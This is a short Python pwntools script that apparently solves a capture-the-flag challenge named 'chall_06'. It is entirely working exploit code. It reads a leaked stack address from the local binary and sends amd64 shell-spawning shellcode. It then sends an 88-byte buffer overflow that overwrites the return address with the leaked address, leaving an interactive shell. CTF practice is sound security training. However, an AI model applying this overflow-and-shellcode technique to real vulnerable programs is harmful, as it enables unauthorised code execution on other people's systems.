# coding: utf-8
def chall06():
    p = process("./chall_06")
    p.recvuntil("I drink milk even though i'm lactose intolerant:")
    context.arch = "amd64"
    a = asm(shellcraft.sh())
    len_a = len(a)
    c = p.recv()
    intc = int(c, 16)
    payload = a 
    p.sendline(payload)
    payload1 = ( b"a"*88 + p64(intc))
    p.sendline(payload1)
    p.interactive()
    
    
chall06()
